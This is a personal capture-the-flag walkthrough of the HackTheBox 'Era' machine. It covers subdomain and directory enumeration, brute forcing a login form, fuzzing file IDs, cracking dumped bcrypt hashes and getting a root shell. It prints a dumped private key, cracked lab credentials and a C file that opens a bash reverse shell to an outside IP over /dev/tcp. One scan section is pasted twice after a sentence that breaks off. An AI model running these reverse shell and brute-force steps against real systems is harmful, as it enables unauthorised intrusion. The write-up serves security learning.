Quick port scanning
```bash
nmap -p- --min-rate=5000 10.10.11.79
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 20:54 EEST
Nmap scan report for 10.10.11.79
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,80 -sC -sV 10.10.11.79       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 20:55 EEST
Nmap scan report for 10.10.11.79
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
```

Ok so we have an ftp and a website. 
We are adding era.htb to the /etc/hosts file

I did some directory scanning to see if there is something interesting hidden
```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://era.htb/ -t 150 -x php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/index.html           (Status: 200) [Size: 19493]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
Progress: 61407 / 61407 (100.00%)
```

There was nothing so I used feroxbuster since it digs deeper so it could potentially find something.

I was kinda lost since i didn't find anything. 

I decided to search for subDomains and i found something

```bash
wfuzz -u http://era.htb -H "HOST: FUZZ.era.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --hc 302  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://era.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                            
=====================================================================

000000687:   200        233 L    559 W      6765 Ch     "file - file"
```
Well the name kinda gives it away but it's a place where u can store and upload stuff to.

There was nothing so i did some scanning here also.

```bash
gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/big.txt --exclude-length 6765

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/LICENSE              (Status: 200) [Size: 34524]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
```

nothing...

There is an option to log in using security questions. I feel like this is our way to bruteforce our way inside. It even said if that username is found in the database which we can reverse engineer.

Well we got the username. Now we just need to figure out the answers if thats even possible

```bash
ffuf -u http://file.era.htb/security_login.php \
     -X POST \
     -d "username=FUZZ&answer1=dog&answer2=dog&answer3=dog" \
     -w /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fr "User not found."


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://file.era.htb/security_login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&answer1=dog&answer2=dog&answer3=dog
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: User not found.
________________________________________________

test                    [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 69ms]
:: Progress: [828/828] :: Job [1/1] :: 487 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Ok that was a waste of time. I got nothing from that.

I decided to do another massive scan and this time I found alot more stuff. I shoulda have let it ran for longer the first time. Could have saved some precious time.


```bash
gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/big.txt -x txt,php,html --exclude-length 6765 -t 300   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd.html       (Status: 403) [Size: 162]
/.htpasswd.txt        (Status: 403) [Size: 162]
/.htaccess.html       (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess.txt        (Status: 403) [Size: 162]
/LICENSE              (Status: 200) [Size: 34524]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/cgi-bin/.html        (Status: 403) [Size: 162]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/layout.php           (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 9214]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 3205]
/reset.php            (Status: 302) [Size: 0] [--> login.php]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
```

Register.php looks very promising since it return size is fairly large compared to the others.

Great we were able to greate

I decided to do another massive scan and this time I found alot more stuff. I shoulda have let it ran for longer the first time. Could have saved some precious time.


```bash
gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/big.txt -x txt,php,html --exclude-length 6765 -t 300   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd.html       (Status: 403) [Size: 162]
/.htpasswd.txt        (Status: 403) [Size: 162]
/.htaccess.html       (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess.txt        (Status: 403) [Size: 162]
/LICENSE              (Status: 200) [Size: 34524]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/cgi-bin/.html        (Status: 403) [Size: 162]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/layout.php           (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 9214]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 3205]
/reset.php            (Status: 302) [Size: 0] [--> login.php]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
```

Register.php looks very promising since it return size is fairly large compared to the others.

Great we were able to create an website and we were able to log in with placeholder:placeholder

We can now upload files and such. 

I tried uploding a shell but its not executed so nothing happens. But I noticed thats it uses an argument ?id=<number> and this was something we could fuzz

```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -b "PHPSESSID=tcm5nud45n77aprk8pmod4llu7" -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Cookie: PHPSESSID=tcm5nud45n77aprk8pmod4llu7
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

0054                    [Status: 200, Size: 6380, Words: 2552, Lines: 222, Duration: 73ms]
0150                    [Status: 200, Size: 6367, Words: 2552, Lines: 222, Duration: 68ms]
1334                    [Status: 200, Size: 6368, Words: 2552, Lines: 222, Duration: 88ms]
:: Progress: [10000/10000] :: Job [1/1] :: 539 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

I just had to set my tokens since its behind a login but we got some findings. My guess is something related to the ftp server maybe? I hope so.

We got two things. A size backup zip and a signing zip. I obviously got both of them.

```bash
ls    
bg.jpg         functions.global.php  layout.php  manage.php    screen-download.png  security_login.php
css            index.php             LICENSE     register.php  screen-login.png     signing.zip
download.php   initial_layout.php    login.php   reset.php     screen-main.png      upload.php
filedb.sqlite  key.pem               logout.php  revshell.php  screen-manage.png    webfonts
files          layout_login.php      main.png    sass          screen-upload.png    x509.genkey
```
We got a bunch of stuff to go through.

The first thing that caught my eye was the filedb.sqlite which i opened with sqlite3 and i got the following

```bash
BEGIN TRANSACTION;
CREATE TABLE files (
                fileid int NOT NULL PRIMARY KEY,
                filepath varchar(255) NOT NULL,
                fileowner int NOT NULL,
                filedate timestamp NOT NULL
                );
INSERT INTO files VALUES(54,'files/site-backup-30-08-24.zip',1,1725044282);
CREATE TABLE users (
                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_name varchar(255) NOT NULL,
                user_password varchar(255) NOT NULL,
                auto_delete_files_after int NOT NULL
                , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));
INSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');
INSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(5,'john','$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(6,'ethan','$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC',-1,NULL,NULL,NULL);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',16);
COMMIT;
```

and it had some credentials inside which were encrypted so its hashcat time and we'll see what we have.

I was able to crack one of the passwords
```bash
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america

eric:america
```
I tried the ftp at first but that was not working so i decided the website since u can store files in there aswell..
There was nothing. Imma just check the backup files again.

There was a file called key.pem and it had a private key
```bash
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
```
BUT there is no ssh so we can't really do much with this. 

I let the hashcat run for the entire time and it also found yuris password. 
yuri:mustang
For some reason yuri can log into ftp but eric was just completely blacklisted from there.

There was alot of stuff and i downloaded them all.

I was again kinda lost since there was so much stuff and logins going on. I looked at the download.php file since downloading stuff usually has some methods of tampering with.

There is a beta feature for admin whose username and password we have. Allthough we havent cracked it yet.

```bash
 // BETA (Currently only available to the admin) - Showcase file instead of downloading it
```

Showcasing a file would mean that the server fetches the file which would then execute our reverse shell in theory? We'll see

I tried to bruteforce the admin login for ages but nothing. But I was logged in as Eric and he is able to change the security questions of any username?? ok..


OK now we are in as admin. And since we uploaded that shell earlier we can just open it. The id of it was 1333 or smth like that I believ. But let's setup nc -lvnp 4444 first.
For some reason that file was not there anymore so i just reuploaded it.


```bash
http://file.era.htb/download.php?id=3910&show=true

Opening: files/revshell.php Resource id #2
```

It says that its trying to open it but nothing happens. I feel like we need to try another exploit.
This is where i felt like giving up since i didn't know what to do. I went to the forums and we had to abuse the _format parameter since it allows userinput but i had no idea what kinda input it can take that would lead us to a RCE.

The format is pretty much
```bash
http://file.era.htb/download.php?id=54&show=true&format=<EXPLOIT>
```
Not sure how to explain it since I have no idea what's going on but we are able to use PHP wrappes to get a reverse shell 


But it worked and we got a shell now

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.183] from (UNKNOWN) [10.10.11.79] 37870
bash: cannot set terminal process group (25440): Inappropriate ioctl for device
bash: no job control in this shell
yuri@era:~$ whoami
whoami
yuri
yuri@era:~$ 
```

The shell was kinda messed up so i fixed it

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

I don't see anything on the "yuri" acc so i try to log on to eric with the password that we cracked.

```bash
eric@era:~$ cat user.txt
84e17c44d671b1502b2c946df814c576
```

I imported linpeas to check for stuff.


```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files    
  Group eric:                                                                                       
/opt/AV/periodic-checks/backdoor.c                                                                  
/opt/AV/periodic-checks/sig
/opt/AV/periodic-checks/monitor_backdoor
  Group devs:
/opt/AV                                                                                             
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

backdoor.c ... that's fairly suspicious...

```bash
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.70/4445 0>&1'");
    return 0;
}
```

Ithere is a status log which talks about scans etc so i feel like this script is possibly in crontabs and is ran by something. I decided to just change it to my ip and see if i get a ping

Since it was just a .c script i compiled it

```bash
gcc backdoor.c -o backdoor
```
well...... How do we get it executed as something else other than us. Since a shell of ourselves is not gonna do much.

I checked all the processes that are ran by root and it ran the scripts. Ok so forget the previous attempt.
We have to create an exploit.c and sign it using the signature we got from the website. 

I can't take any credit for the privesc since I don't have the brain capacity to do something like that myself.

But we managed to get the root shell and root'd the machine.
